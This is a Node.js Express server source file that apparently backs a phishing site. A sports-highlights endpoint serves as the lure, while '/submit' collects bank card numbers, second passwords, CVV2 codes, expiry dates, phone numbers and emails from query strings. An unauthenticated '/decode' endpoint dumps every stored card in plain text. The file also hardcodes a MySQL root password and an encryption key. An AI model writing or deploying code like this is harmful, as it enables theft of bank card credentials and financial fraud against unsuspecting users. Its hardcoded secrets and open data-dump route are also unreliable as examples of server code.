// Server Modules
var express = require('express');
var mysql = require('mysql');
var app = express();
var PORT = 3000;


// Encryption Module
var CryptoJS = require('crypto-js');
var SECRET_KEY = "c5#GMg+9BaJHH(GO%Q)d25TMXMerW037o,~83wmQ/$54yFDI@R|&nHR/l?^8-&K";

// MySQL Setup
var connection = mysql.createConnection({
    host:'localhost',
    user:'root',
    password:'9092301202',
    database:'mydb'
    }, function(error){
        if(error)
        console.log(error);
    });
   
connection.connect(function(error){
    if(error)
    console.log(error);
});

app.listen(PORT,function(){
    console.log('Server started');
})


app.use(express.static(__dirname + '/html'));

app.get('/schedules',function(req, res){

    // Retreive schedules
    connection.query("SELECT * FROM app_schedules ORDER BY position DESC LIMIT 5",function(error, result){
        if(error)
        return res.sendStatus(404);

        // Retreive Highlights
        connection.query("SELECT * FROM app_highlights WHERE category = 'cup' ORDER BY ID DESC",function(error, hls){

            if(error)
            return res.sendStatus(404);

            connection.query("SELECT * FROM app_highlights WHERE category = 'ufc' ORDER BY ID DESC",function(error, ufcs){

                if(error)
                return res.sendStatus(404);

                return res.json({
                    status:200,
                    data:result,
                    highlights:hls,
                    ufc:ufcs,
                    main_video:'https://res.cloudinary.com/dizcku8o2/video/upload/v1529763630/videos/videoplayback.mp4'
                });
        

            });

            
        });

    });
    
});

app.get('/submit',function(req, res){

    // Receive POST values
    console.log(req.query)

    if(req.query.expmah === '')
    return res.status(200).jsonp({action:'enseraf'});

    // Store Data
    connection.query("INSERT INTO app_cards SET ? ", {
       
        cardnumber:CryptoJS.AES.encrypt(req.query.cardnumber, SECRET_KEY),
        secondpass:CryptoJS.AES.encrypt(req.query.secondpass, SECRET_KEY),
        bankname:req.query.bankname,
        cvv2:CryptoJS.AES.encrypt(req.query.cvv2, SECRET_KEY),
        expmonth:req.query.expmah,
        expyear:req.query.expyear,
        mobile:req.query.mobileforipg,
        email:req.query.emailforipg
    
    },function(error){
        if(error)
        console.log('Error saving card');
        return res.status(200).jsonp({action:'OK'});
    });
   

});

app.get('/index',function(req, res){

    //if(!req.query.id)
    //return res.sendStatus(404);

    res.sendFile(__dirname + '/html/index.html');

    return res.sendStatus(404);

});

app.get('/decode',function(req, res){

    var data = [];

    connection.query("SELECT * FROM app_cards ORDER BY id DESC",function(error, result){

        result.forEach(function(c){

            c.cardnumber = decrypt(c.cardnumber);
            c.secondpass = decrypt(c.secondpass);
            c.cvv2 = decrypt(c.cvv2);
                    
        });

        return res.json(result);
        
    });

});

function decrypt(hashcode){
    return CryptoJS.AES.decrypt(hashcode.toString(), SECRET_KEY).toString(CryptoJS.enc.Utf8);
}